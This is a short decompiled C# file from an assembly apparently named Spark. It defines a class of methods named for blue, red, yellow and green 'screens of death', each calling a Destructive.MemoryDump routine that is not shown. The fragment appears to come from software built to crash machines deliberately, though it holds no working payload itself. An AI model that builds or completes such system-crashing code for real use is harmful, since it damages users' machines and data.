// Decompiled with JetBrains decompiler
// Type: Spark.ForDebugMode
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

#nullable disable
namespace Spark;

internal class ForDebugMode
{
  public static void BlueScreenOfDeath() => Destructive.MemoryDump(0);

  public static void RedScreenOfDeath() => Destructive.MemoryDump(1);

  public static void YellowScreenOfDeath() => Destructive.MemoryDump(2);

  public static void GreenScreenOfDeath() => Destructive.MemoryDump(3);
}
